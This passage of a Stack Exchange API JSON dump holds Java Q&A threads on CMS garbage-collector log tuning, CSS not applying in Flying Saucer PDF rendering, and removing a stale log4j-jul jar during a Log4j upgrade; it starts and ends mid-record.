thanks"},{"owner":{"account_id":98291,"reputation":3509,"user_id":266167,"display_name":"Joshua Davis"},"score":0,"creation_date":1277396361,"post_id":2906676,"comment_id":3192880,"body_markdown":"Initiating CMS at 50% seems kind of low to me: -XX:CMSInitiatingOccupancyFraction=50\n\nMaybe increasing it (or using the defaults as &#39;antispam&#39; suggests) will behave differently.\n\nAlso, my logs usually have ParNew running them before, during, and after CMS.   Is ParNew running?","body":"Initiating CMS at 50% seems kind of low to me: -XX:CMSInitiatingOccupancyFraction=50  Maybe increasing it (or using the defaults as &#39;antispam&#39; suggests) will behave differently.  Also, my logs usually have ParNew running them before, during, and after CMS.   Is ParNew running?"}],"answers":[{"tags":[],"owner":{"account_id":15754,"reputation":8442,"user_id":33622,"accept_rate":88,"display_name":"fglez"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1277374347,"creation_date":1277374347,"answer_id":3108979,"question_id":2906676,"body_markdown":"&gt; [Times: user=0.00 sys=0.01, real=5.09 secs]\r\n\r\nI would try investigate why `CMS-concurrent-abortable-preclean-start` doesn&#39;t get neither user nor sys CPU time in 5 seconds.\r\n\r\nMy suggestion is starting from a &#39;clean&#39; JVM CMS startup flags like\r\n\r\n    -Djava.awt.headless=true\r\n    -Xms512m\r\n    -Xmx512m\r\n    -Xmn128m\r\n    -Xss128k\r\n    -XX:MaxPermSize=128m\r\n    -XX:+UseConcMarkSweepGC\r\n    -XX:+HeapDumpOnOutOfMemoryError\r\n    -Xloggc:gc.log\r\n    -XX:+PrintGCTimeStamps\r\n    -XX:+PrintGCDetails\r\n    -XX:+PrintHeapAtGC\r\n \r\nthen check if the problem reproduces and keep tweaking one parameter at a time.","title":"JVM CMS Garbage Collecting Issues","body":"<blockquote>\n  <p>[Times: user=0.00 sys=0.01, real=5.09 secs]</p>\n</blockquote>\n\n<p>I would try investigate why <code>CMS-concurrent-abortable-preclean-start</code> doesn't get neither user nor sys CPU time in 5 seconds.</p>\n\n<p>My suggestion is starting from a 'clean' JVM CMS startup flags like</p>\n\n<pre><code>-Djava.awt.headless=true\n-Xms512m\n-Xmx512m\n-Xmn128m\n-Xss128k\n-XX:MaxPermSize=128m\n-XX:+UseConcMarkSweepGC\n-XX:+HeapDumpOnOutOfMemoryError\n-Xloggc:gc.log\n-XX:+PrintGCTimeStamps\n-XX:+PrintGCDetails\n-XX:+PrintHeapAtGC\n</code></pre>\n\n<p>then check if the problem reproduces and keep tweaking one parameter at a time.</p>\n"},{"tags":[],"owner":{"account_id":321364,"reputation":31,"user_id":640147,"display_name":"Gabi Kaltman"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1329428713,"creation_date":1329428713,"answer_id":9319557,"question_id":2906676,"body_markdown":"As someone has already mentioned, the first step would be to increase the CMSInitiatingOccupancyFraction.\r\n\r\nAs a second step, I would use the flag `-XX:-PrintTenuringDistribution` and make sure that there is no premature promotion from the young generation to the old one. This would lead to old-to-young references which might lead to a longer abortable preclean phase.\r\nIf there is such a premature promotion, try to adjust the ratio between the eden and the survior spaces.","title":"JVM CMS Garbage Collecting Issues","body":"<p>As someone has already mentioned, the first step would be to increase the CMSInitiatingOccupancyFraction.</p>\n\n<p>As a second step, I would use the flag <code>-XX:-PrintTenuringDistribution</code> and make sure that there is no premature promotion from the young generation to the old one. This would lead to old-to-young references which might lead to a longer abortable preclean phase.\nIf there is such a premature promotion, try to adjust the ratio between the eden and the survior spaces.</p>\n"},{"tags":[],"owner":{"account_id":1836786,"reputation":20603,"user_id":1667004,"display_name":"ppeterka"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1412328276,"creation_date":1412328276,"answer_id":26176449,"question_id":2906676,"body_markdown":"There is a good explanation [here](http://mail.openjdk.java.net/pipermail/hotspot-gc-use/2011-May/000862.html) about this phenomenon:\r\n\r\nQuote:\r\n\r\n&gt; &gt; So when the system load is light(which means there will be no\r\n&gt; &gt; minor gc), precleaning  will always  time out and full gc will always\r\n&gt; &gt; fail. cpu is waste.\r\n&gt;\r\n&gt; It won&#39;t fail. It&#39;ll be less parallel (i.e. less efficient, and would\r\n&gt; have a longer pause time, for lesser work).\r\n\r\nSo all in all: this seems to be normal operation - the thread just waits for a minor GC to happen for 5 seconds, but there is no big issue when this does not happen: the JVM chooses a different (less efficient) strategy to continue with the GC.\r\n","title":"JVM CMS Garbage Collecting Issues","body":"<p>There is a good explanation <a href=\"http://mail.openjdk.java.net/pipermail/hotspot-gc-use/2011-May/000862.html\" rel=\"nofollow\">here</a> about this phenomenon:</p>\n\n<p>Quote:</p>\n\n<blockquote>\n  <blockquote>\n    <p>So when the system load is light(which means there will be no\n    minor gc), precleaning  will always  time out and full gc will always\n    fail. cpu is waste.</p>\n  </blockquote>\n  \n  <p>It won't fail. It'll be less parallel (i.e. less efficient, and would\n  have a longer pause time, for lesser work).</p>\n</blockquote>\n\n<p>So all in all: this seems to be normal operation - the thread just waits for a minor GC to happen for 5 seconds, but there is no big issue when this does not happen: the JVM chooses a different (less efficient) strategy to continue with the GC.</p>\n"},{"tags":[],"owner":{"account_id":1144755,"reputation":1415,"user_id":1127772,"display_name":"Carlos Saltos"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640261868,"creation_date":1640261465,"answer_id":70461990,"question_id":2906676,"body_markdown":"For the service I&#39;m using I added:\r\n\r\n    -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=80\r\n\r\nThis configures the JVM to start the marking only after 80% is full and it&#39;s worth giving it a try.","title":"JVM CMS Garbage Collecting Issues","body":"<p>For the service I'm using I added:</p>\n<pre><code>-XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=80\n</code></pre>\n<p>This configures the JVM to start the marking only after 80% is full and it's worth giving it a try.</p>\n"}],"owner":{"account_id":12730,"reputation":463,"user_id":25218,"display_name":"jlintz"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6086,"favorite_count":0,"down_vote_count":0,"up_vote_count":13,"answer_count":4,"score":13,"last_activity_date":1640261868,"creation_date":1274806395,"question_id":2906676,"body_markdown":"I&#39;m seeing the following symptoms on an application&#39;s GC log file with the Concurrent Mark-Sweep collector:\r\n\r\n    4031.248: [CMS-concurrent-preclean-start]\r\n    4031.250: [CMS-concurrent-preclean: 0.002/0.002 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] \r\n    4031.250: [CMS-concurrent-abortable-preclean-start]\r\n     CMS: abort preclean due to time 4036.346: [CMS-concurrent-abortable-preclean: 0.159/5.096 secs] [Times: user=0.00 sys=0.01, real=5.09 secs] \r\n    4036.346: [GC[YG occupancy: 55964 K (118016 K)]4036.347: [Rescan (parallel) , 0.0641200 secs]4036.411: [weak refs processing, 0.0001300 secs]4036.411: [class unloading, 0.0041590 secs]4036.415: [scrub symbol &amp; string tables, 0.0053220 secs] [1 CMS-remark: 16015K(393216K)] 71979K(511232K), 0.0746640 secs] [Times: user=0.08 sys=0.00, real=0.08 secs] \r\n\r\nThe preclean process keeps aborting continously.  I&#39;ve tried adjusting CMSMaxAbortablePrecleanTime to 15 seconds, from the default of 5, but that has not helped.  The current JVM options are as follows...\r\n\r\n    Djava.awt.headless=true\r\n     -Xms512m\r\n     -Xmx512m\r\n     -Xmn128m\r\n     -XX:MaxPermSize=128m\r\n     -XX:+HeapDumpOnOutOfMemoryError\r\n     -XX:+UseParNewGC\r\n     -XX:+UseConcMarkSweepGC\r\n     -XX:BiasedLockingStartupDelay=0\r\n     -XX:+DoEscapeAnalysis\r\n     -XX:+UseBiasedLocking\r\n     -XX:+EliminateLocks\r\n     -XX:+CMSParallelRemarkEnabled\r\n     -verbose:gc\r\n     -XX:+PrintGCTimeStamps\r\n     -XX:+PrintGCDetails\r\n     -XX:+PrintHeapAtGC\r\n     -Xloggc:gc.log\r\n     -XX:+CMSClassUnloadingEnabled\r\n     -XX:+CMSPermGenPrecleaningEnabled\r\n     -XX:CMSInitiatingOccupancyFraction=50\r\n     -XX:ReservedCodeCacheSize=64m\r\n     -Dnetworkaddress.cache.ttl=30\r\n     -Xss128k\r\n\r\nIt appears the concurrent-abortable-preclean never gets a chance to run.  I read through https://blogs.oracle.com/jonthecollector/entry/did_you_know which had a suggestion of enabling CMSScavengeBeforeRemark, but the side effects of pausing did not seem ideal.  Could anyone offer up any suggestions?\r\n\r\nAlso I was wondering if anyone had a good reference for grokking the CMS GC logs, in particular this line:\r\n\r\n    [1 CMS-remark: 16015K(393216K)] 71979K(511232K), 0.0746640 secs]\r\n\r\nNot clear on what memory regions those numbers are referring to.\r\n**Edit**  Found a link to this http://www.sun.com/bigadmin/content/submitted/cms_gc_logs.jsp \r\n","title":"JVM CMS Garbage Collecting Issues","body":"<p>I'm seeing the following symptoms on an application's GC log file with the Concurrent Mark-Sweep collector:</p>\n\n<pre><code>4031.248: [CMS-concurrent-preclean-start]\n4031.250: [CMS-concurrent-preclean: 0.002/0.002 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] \n4031.250: [CMS-concurrent-abortable-preclean-start]\n CMS: abort preclean due to time 4036.346: [CMS-concurrent-abortable-preclean: 0.159/5.096 secs] [Times: user=0.00 sys=0.01, real=5.09 secs] \n4036.346: [GC[YG occupancy: 55964 K (118016 K)]4036.347: [Rescan (parallel) , 0.0641200 secs]4036.411: [weak refs processing, 0.0001300 secs]4036.411: [class unloading, 0.0041590 secs]4036.415: [scrub symbol &amp; string tables, 0.0053220 secs] [1 CMS-remark: 16015K(393216K)] 71979K(511232K), 0.0746640 secs] [Times: user=0.08 sys=0.00, real=0.08 secs] \n</code></pre>\n\n<p>The preclean process keeps aborting continously.  I've tried adjusting CMSMaxAbortablePrecleanTime to 15 seconds, from the default of 5, but that has not helped.  The current JVM options are as follows...</p>\n\n<pre><code>Djava.awt.headless=true\n -Xms512m\n -Xmx512m\n -Xmn128m\n -XX:MaxPermSize=128m\n -XX:+HeapDumpOnOutOfMemoryError\n -XX:+UseParNewGC\n -XX:+UseConcMarkSweepGC\n -XX:BiasedLockingStartupDelay=0\n -XX:+DoEscapeAnalysis\n -XX:+UseBiasedLocking\n -XX:+EliminateLocks\n -XX:+CMSParallelRemarkEnabled\n -verbose:gc\n -XX:+PrintGCTimeStamps\n -XX:+PrintGCDetails\n -XX:+PrintHeapAtGC\n -Xloggc:gc.log\n -XX:+CMSClassUnloadingEnabled\n -XX:+CMSPermGenPrecleaningEnabled\n -XX:CMSInitiatingOccupancyFraction=50\n -XX:ReservedCodeCacheSize=64m\n -Dnetworkaddress.cache.ttl=30\n -Xss128k\n</code></pre>\n\n<p>It appears the concurrent-abortable-preclean never gets a chance to run.  I read through <a href=\"https://blogs.oracle.com/jonthecollector/entry/did_you_know\" rel=\"noreferrer\">https://blogs.oracle.com/jonthecollector/entry/did_you_know</a> which had a suggestion of enabling CMSScavengeBeforeRemark, but the side effects of pausing did not seem ideal.  Could anyone offer up any suggestions?</p>\n\n<p>Also I was wondering if anyone had a good reference for grokking the CMS GC logs, in particular this line:</p>\n\n<pre><code>[1 CMS-remark: 16015K(393216K)] 71979K(511232K), 0.0746640 secs]\n</code></pre>\n\n<p>Not clear on what memory regions those numbers are referring to.\n<strong>Edit</strong>  Found a link to this <a href=\"http://www.sun.com/bigadmin/content/submitted/cms_gc_logs.jsp\" rel=\"noreferrer\">http://www.sun.com/bigadmin/content/submitted/cms_gc_logs.jsp</a> </p>\n"},{"tags":["java","css","spring-boot","itext","thymeleaf"],"answers":[{"tags":[],"owner":{"account_id":15927603,"reputation":23,"user_id":11492828,"display_name":"Luigi De Cosmis"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640261575,"creation_date":1640261575,"answer_id":70462012,"question_id":60820045,"body_markdown":"# Problem #\r\nHi i don&#39;t know if you already fixed the problem but i&#39;ll give you my solution. The same problem happened to me, i was trying to link css into html but nothing happened without any warning. This problem is related with the method call in your java code.\r\n```\r\nrenderer.setDocumentFromString(processedHtml);\r\n```\r\nThis method has one overload\r\n```\r\npublic void setDocumentFromString(String content, String baseUrl);\r\n```\r\nas you can see it also accepts the &lt;b&gt;baseUrl&lt;/b&gt; wich is required for picking the right file.\r\n\r\n# Solution #\r\nFirstly i&#39;ve generated a &lt;b&gt;baseUrl&lt;/b&gt; where my resource files are located.\r\n```\r\nprivate static void generatePdf(String html) throws Exception {\r\n        String outputFolder = System.getProperty(&quot;user.home&quot;) + File.separator + &quot;thymeleaf.pdf&quot;;\r\n        OutputStream outputStream = new FileOutputStream(outputFolder);\r\n\r\n        String baseUrl = FileSystems\r\n                .getDefault()\r\n                .getPath(&quot;src&quot;, &quot;main&quot;, &quot;resources&quot;)\r\n                .toUri()\r\n                .toURL()\r\n                .toString();\r\n\r\n        ITextRenderer renderer = new ITextRenderer();\r\n        renderer.setDocumentFromString(html, baseUrl);\r\n        renderer.layout();\r\n        renderer.createPDF(outputStream);\r\n\r\n        outputStream.close();\r\n}\r\n```\r\nSecondly i&#39;ve inserted the css file related to the &lt;b&gt;basePath&lt;/b&gt;\r\n```\r\n&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;\r\n&lt;head&gt;\r\n    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; href=&quot;style.css&quot;/&gt;\r\n&lt;/head&gt;\r\n```\r\n\r\n","title":"Spring Boot + Thymeleaf + Flying Saucer imported css not working","body":"<h1>Problem</h1>\n<p>Hi i don't know if you already fixed the problem but i'll give you my solution. The same problem happened to me, i was trying to link css into html but nothing happened without any warning. This problem is related with the method call in your java code.</p>\n<pre><code>renderer.setDocumentFromString(processedHtml);\n</code></pre>\n<p>This method has one overload</p>\n<pre><code>public void setDocumentFromString(String content, String baseUrl);\n</code></pre>\n<p>as you can see it also accepts the <b>baseUrl</b> wich is required for picking the right file.</p>\n<h1>Solution</h1>\n<p>Firstly i've generated a <b>baseUrl</b> where my resource files are located.</p>\n<pre><code>private static void generatePdf(String html) throws Exception {\n        String outputFolder = System.getProperty(&quot;user.home&quot;) + File.separator + &quot;thymeleaf.pdf&quot;;\n        OutputStream outputStream = new FileOutputStream(outputFolder);\n\n        String baseUrl = FileSystems\n                .getDefault()\n                .getPath(&quot;src&quot;, &quot;main&quot;, &quot;resources&quot;)\n                .toUri()\n                .toURL()\n                .toString();\n\n        ITextRenderer renderer = new ITextRenderer();\n        renderer.setDocumentFromString(html, baseUrl);\n        renderer.layout();\n        renderer.createPDF(outputStream);\n\n        outputStream.close();\n}\n</code></pre>\n<p>Secondly i've inserted the css file related to the <b>basePath</b></p>\n<pre><code>&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;\n&lt;head&gt;\n    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; href=&quot;style.css&quot;/&gt;\n&lt;/head&gt;\n</code></pre>\n"}],"owner":{"account_id":16084612,"reputation":567,"user_id":11834812,"display_name":"Ombrelin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1338,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640261575,"creation_date":1584990363,"question_id":60820045,"body_markdown":"I don&#39;t understand why css is not working (I already followed what is said on [this thread][1])\r\nI have the following file structure for my ressources : \r\n```\r\nresources\r\n    - static\r\n         -style\r\n            style.css\r\n - templates:\r\n      - CV.html\r\n```\r\nIn the template I verified that the URL is correctly generated, it is.\r\nThe CSS is also correctly served : when I use the generated URL in the browser, the CSS file is served.\r\n\r\nMy Template code : \r\n```html\r\n&lt;!DOCTYPE HTML&gt;\r\n&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;fr&quot;&gt;\r\n&lt;head&gt;\r\n    &lt;title&gt;CV ARSENE LAPOSTOLET&lt;/title&gt;\r\n    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;/&gt;\r\n    &lt;link type=&quot;stylesheet&quot; href=&quot;../static/css/style.css&quot; th:href=&quot;@{|${baseUrl}/css/style.css|}&quot;/&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n&lt;span th:text=&quot;|${baseUrl}/css/style.css|&quot;&gt;&lt;/span&gt;\r\n\r\n&lt;!--/*@thymesVar id=&quot;abilities&quot; type=&quot;List&lt;Ability&gt;&quot;*/--&gt;\r\n&lt;div class=&quot;rouge&quot; th:each=&quot;ability: ${abilities}&quot;&gt;\r\n    &lt;span th:text=&quot;${ability.getName()}&quot;&gt;&lt;/span&gt;\r\n&lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n```\r\n\r\nMy Java code : \r\n\r\n```java\r\n@RestController\r\n@RequestMapping(&quot;/cv&quot;)\r\n@AllArgsConstructor\r\npublic class CvController {\r\n\r\n    private CvService cvService;\r\n    private AbilityRepository abilityRepository;\r\n    private ServletContext servletContext;\r\n\r\n    @GetMapping(&quot;&quot;)\r\n    public ResponseEntity&lt;Resource&gt; getCv(HttpServletRequest servletRequest, HttpServletResponse servletResponse){\r\n        Locale locale = getLocale(servletRequest);\r\n        WebContext context = new WebContext(servletRequest, servletResponse, servletContext, locale);\r\n        context.setVariable(&quot;abilities&quot;, abilityRepository.findAll());\r\n        context.setVariable(&quot;baseUrl&quot;,getCurrentBaseUrl());\r\n\r\n        return ResponseEntity.ok()\r\n                .contentType(MediaType.parseMediaType(&quot;application/pdf&quot;))\r\n                .header(HttpHeaders.CONTENT_DISPOSITION, &quot;attachment; filename=\\&quot;&quot; + &quot;CV_ARSENE_LAPOSTOLET.pdf&quot; + &quot;\\&quot;&quot;)\r\n                .body(new ByteArrayResource(cvService.renderCv(context)));\r\n    }\r\n\r\n    private static String getCurrentBaseUrl() {\r\n        ServletRequestAttributes sra = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\r\n        HttpServletRequest req = sra.getRequest();\r\n        return req.getScheme() + &quot;://&quot; + req.getServerName() + &quot;:&quot; + req.getServerPort() + req.getContextPath();\r\n    }\r\n}\r\n```\r\n\r\n```java\r\n@Service\r\n@AllArgsConstructor\r\n@CommonsLog\r\npublic class CvService {\r\n\r\n    private TemplateEngine templateEngine;\r\n\r\n    public byte[] renderCv(WebContext ctx) {\r\n\r\n        String processedHtml = templateEngine.process(&quot;CV&quot;, ctx);\r\n\r\n        try (ByteArrayOutputStream os = new ByteArrayOutputStream()) {\r\n            ITextRenderer renderer = new ITextRenderer();\r\n            renderer.setDocumentFromString(processedHtml);\r\n            renderer.layout();\r\n            renderer.createPDF(os);\r\n\r\n            return os.toByteArray();\r\n        } catch (DocumentException | IOException e) {\r\n            e.printStackTrace();\r\n            return null;\r\n        }\r\n    }\r\n\r\n\r\n}\r\n```\r\n\r\n\r\n  [1]: https://stackoverflow.com/questions/53203909/spring-boot-thymeleaf-css-is-not-applied-to-template\r\n","title":"Spring Boot + Thymeleaf + Flying Saucer imported css not working","body":"<p>I don't understand why css is not working (I already followed what is said on <a href=\"https://stackoverflow.com/questions/53203909/spring-boot-thymeleaf-css-is-not-applied-to-template\">this thread</a>)\nI have the following file structure for my ressources : </p>\n\n<pre><code>resources\n    - static\n         -style\n            style.css\n - templates:\n      - CV.html\n</code></pre>\n\n<p>In the template I verified that the URL is correctly generated, it is.\nThe CSS is also correctly served : when I use the generated URL in the browser, the CSS file is served.</p>\n\n<p>My Template code : </p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;!DOCTYPE HTML&gt;\n&lt;html xmlns:th=\"http://www.thymeleaf.org\" lang=\"fr\"&gt;\n&lt;head&gt;\n    &lt;title&gt;CV ARSENE LAPOSTOLET&lt;/title&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/&gt;\n    &lt;link type=\"stylesheet\" href=\"../static/css/style.css\" th:href=\"@{|${baseUrl}/css/style.css|}\"/&gt;\n\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;span th:text=\"|${baseUrl}/css/style.css|\"&gt;&lt;/span&gt;\n\n&lt;!--/*@thymesVar id=\"abilities\" type=\"List&lt;Ability&gt;\"*/--&gt;\n&lt;div class=\"rouge\" th:each=\"ability: ${abilities}\"&gt;\n    &lt;span th:text=\"${ability.getName()}\"&gt;&lt;/span&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>My Java code : </p>\n\n<pre class=\"lang-java prettyprint-override\"><code>@RestController\n@RequestMapping(\"/cv\")\n@AllArgsConstructor\npublic class CvController {\n\n    private CvService cvService;\n    private AbilityRepository abilityRepository;\n    private ServletContext servletContext;\n\n    @GetMapping(\"\")\n    public ResponseEntity&lt;Resource&gt; getCv(HttpServletRequest servletRequest, HttpServletResponse servletResponse){\n        Locale locale = getLocale(servletRequest);\n        WebContext context = new WebContext(servletRequest, servletResponse, servletContext, locale);\n        context.setVariable(\"abilities\", abilityRepository.findAll());\n        context.setVariable(\"baseUrl\",getCurrentBaseUrl());\n\n        return ResponseEntity.ok()\n                .contentType(MediaType.parseMediaType(\"application/pdf\"))\n                .header(HttpHeaders.CONTENT_DISPOSITION, \"attachment; filename=\\\"\" + \"CV_ARSENE_LAPOSTOLET.pdf\" + \"\\\"\")\n                .body(new ByteArrayResource(cvService.renderCv(context)));\n    }\n\n    private static String getCurrentBaseUrl() {\n        ServletRequestAttributes sra = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n        HttpServletRequest req = sra.getRequest();\n        return req.getScheme() + \"://\" + req.getServerName() + \":\" + req.getServerPort() + req.getContextPath();\n    }\n}\n</code></pre>\n\n<pre class=\"lang-java prettyprint-override\"><code>@Service\n@AllArgsConstructor\n@CommonsLog\npublic class CvService {\n\n    private TemplateEngine templateEngine;\n\n    public byte[] renderCv(WebContext ctx) {\n\n        String processedHtml = templateEngine.process(\"CV\", ctx);\n\n        try (ByteArrayOutputStream os = new ByteArrayOutputStream()) {\n            ITextRenderer renderer = new ITextRenderer();\n            renderer.setDocumentFromString(processedHtml);\n            renderer.layout();\n            renderer.createPDF(os);\n\n            return os.toByteArray();\n        } catch (DocumentException | IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n\n}\n</code></pre>\n"},{"tags":["java","logging","log4j"],"comments":[{"owner":{"account_id":11597672,"reputation":359,"user_id":8495914,"display_name":"Zakir Hussain"},"score":0,"creation_date":1640252184,"post_id":70459811,"comment_id":124552389,"body_markdown":"Try `maven clean` and restart your IDE, this should help you.","body":"Try <code>maven clean</code> and restart your IDE, this should help you."},{"owner":{"account_id":16269349,"reputation":13452,"user_id":11748454,"display_name":"Piotr P. Karwasz"},"score":0,"creation_date":1640252805,"post_id":70459811,"comment_id":124552574,"body_markdown":"`log4j-jul` is not affected by any vulnerability, but should use the same version as the remaining Log4j 2.x libraries. Can you add your POM file to your question to show how you _&quot;changed the dependency to point to 2.17.0&quot;_? There are several options to do that.","body":"<code>log4j-jul</code> is not affected by any vulnerability, but should use the same version as the remaining Log4j 2.x libraries. Can you add your POM file to your question to show how you <i>&quot;changed the dependency to point to 2.17.0&quot;</i>? There are several options to do that."},{"owner":{"account_id":23726788,"reputation":31,"user_id":17746580,"display_name":"VINOD SINGH"},"score":0,"creation_date":1640258592,"post_id":70459811,"comment_id":124554594,"body_markdown":"Thank  you @ZakirHussain i tried but no success","body":"Thank  you @ZakirHussain i tried but no success"},{"owner":{"account_id":23726788,"reputation":31,"user_id":17746580,"display_name":"VINOD SINGH"},"score":0,"creation_date":1640258640,"post_id":70459811,"comment_id":124554613,"body_markdown":"Thanks @PiotrP.Karwasz added","body":"Thanks @PiotrP.Karwasz added"}],"answers":[{"tags":[],"owner":{"account_id":16269349,"reputation":13452,"user_id":11748454,"display_name":"Piotr P. Karwasz"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640261398,"creation_date":1640261398,"answer_id":70461970,"question_id":70459811,"body_markdown":"You must have a transitive dependency on `log4j-jul` and since you didn&#39;t specify the version to use in your managed dependencies, Maven chooses `2.11.2`.\r\n\r\nOf course, specifying the version of all 26 artifacts of the Log4j 2.x project can be tedious, that is why you can import the [`log4j-bom`](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-bom) artifact to do everything faster:\r\n\r\n```lang-xml\r\n&lt;properties&gt;\r\n  &lt;log4j2.version&gt;2.17.0&lt;/log4j2.version&gt;\r\n&lt;/properties&gt;\r\n&lt;dependencyManagement&gt;\r\n  &lt;dependencies&gt;\r\n    &lt;dependency&gt;\r\n      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n      &lt;artifactId&gt;log4j-bom&lt;/artifactId&gt;\r\n      &lt;version&gt;${log4j2.version}&lt;/version&gt;\r\n      &lt;type&gt;pom&lt;/type&gt;\r\n      &lt;scope&gt;import&lt;/scope&gt;\r\n    &lt;/dependency&gt;\r\n  &lt;/dependencies&gt;\r\n&lt;/dependencyManagement&gt;\r\n```","title":"Log4j-jul-2.11.2 issue: Log 4j-Jul produced on deployment","body":"<p>You must have a transitive dependency on <code>log4j-jul</code> and since you didn't specify the version to use in your managed dependencies, Maven chooses <code>2.11.2</code>.</p>\n<p>Of course, specifying the version of all 26 artifacts of the Log4j 2.x project can be tedious, that is why you can import the <a href=\"https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-bom\" rel=\"nofollow noreferrer\"><code>log4j-bom</code></a> artifact to do everything faster:</p>\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;properties&gt;\n  &lt;log4j2.version&gt;2.17.0&lt;/log4j2.version&gt;\n&lt;/properties&gt;\n&lt;dependencyManagement&gt;\n  &lt;dependencies&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n      &lt;artifactId&gt;log4j-bom&lt;/artifactId&gt;\n      &lt;version&gt;${log4j2.version}&lt;/version&gt;\n      &lt;type&gt;pom&lt;/type&gt;\n      &lt;scope&gt;import&lt;/scope&gt;\n    &lt;/dependency&gt;\n  &lt;/dependencies&gt;\n&lt;/dependencyManagement&gt;\n</code></pre>\n"}],"owner":{"account_id":23726788,"reputation":31,"user_id":17746580,"display_name":"VINOD SINGH"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":105,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640261398,"creation_date":1640250279,"question_id":70459811,"body_markdown":"Need a help as I am working on log4j Vulnerability issue. I am working on intellij. I have changed the dependency to point to 2.17.0. However log4j-jul-2.11.2 jar is getting generated. \r\n\r\n-rw-r--r--. 1 mdXXX mdpXXX   23998 Jan  8  2021 log4j-jul-2.11.2.jar\r\n\r\nThis log4j-jul is being picked up from external libraries from Maven. I removed this dependency from library. But its still creating a jar as mentioned above. Any pointers would be helpful.\r\n\r\n\r\nAdding Pom \r\n\r\n    &lt;properties&gt;\r\n            &lt;java.version&gt;1.8&lt;/java.version&gt;\r\n            &lt;spring.version&gt;4.1.6.RELEASE&lt;/spring.version&gt;\r\n            &lt;spring.data.version&gt;1.8.0.RELEASE&lt;/spring.data.version&gt;\r\n          \r\n       &lt;spring.integration.version&gt;4.1.2.RELEASE&lt;/spring.integration.version&gt;\r\n            &lt;slf4j.version&gt;1.6.1&lt;/slf4j.version&gt;\r\n            &lt;junit.version&gt;4.12&lt;/junit.version&gt;\r\n            &lt;testng.version&gt;6.8.21&lt;/testng.version&gt;\r\n            &lt;dbunit.version&gt;2.4.8&lt;/dbunit.version&gt;\r\n            &lt;mockito.version&gt;1.9.5&lt;/mockito.version&gt;\r\n            &lt;spring.dbunit.version&gt;1.2.0&lt;/spring.dbunit.version&gt;\r\n            &lt;hsqldb.version&gt;2.3.2&lt;/hsqldb.version&gt;\r\n            &lt;h2.version&gt;1.4.185&lt;/h2.version&gt;\r\n            &lt;ojdbc6.version&gt;11.2.0.2.0&lt;/ojdbc6.version&gt;\r\n            &lt;wiremock.version&gt;1.40&lt;/wiremock.version&gt;\r\n            &lt;csv.version&gt;1.1&lt;/csv.version&gt;\r\n            &lt;dbcp.version&gt;1.4&lt;/dbcp.version&gt;\r\n            &lt;io.version&gt;2.4&lt;/io.version&gt;\r\n            &lt;velocity.version&gt;1.7&lt;/velocity.version&gt;\r\n            &lt;ucp.version&gt;11.2.0.3&lt;/ucp.version&gt;\r\n            &lt;joda.time.version&gt;2.7&lt;/joda.time.version&gt;\r\n            &lt;hibernate.entitymanager.version&gt;4.3.9.Final&lt;/hibernate.entitymanager.version&gt;\r\n            &lt;hibernate.jpa.version&gt;1.0.0.Final&lt;/hibernate.jpa.version&gt;\r\n            &lt;json.version&gt;2.1-rev7&lt;/json.version&gt;\r\n    \r\n            &lt;surefire.plugin.version&gt;2.18.1&lt;/surefire.plugin.version&gt;\r\n            &lt;failsafe.plugin.version&gt;2.18.1&lt;/failsafe.plugin.version&gt;\r\n            &lt;compiler.plugin.version&gt;3.3&lt;/compiler.plugin.version&gt;\r\n            &lt;assembly.plugin.version&gt;3.0.0&lt;/assembly.plugin.version&gt;\r\n            &lt;release.plugin.version&gt;2.3.2&lt;/release.plugin.version&gt;\r\n            &lt;pmd.plugin.version&gt;3.8&lt;/pmd.plugin.version&gt;\r\n            &lt;checkstyle.plugin.version&gt;2.13&lt;/checkstyle.plugin.version&gt;\r\n            &lt;rulesets-directory&gt;build&lt;/rulesets-directory&gt;\r\n    \r\n            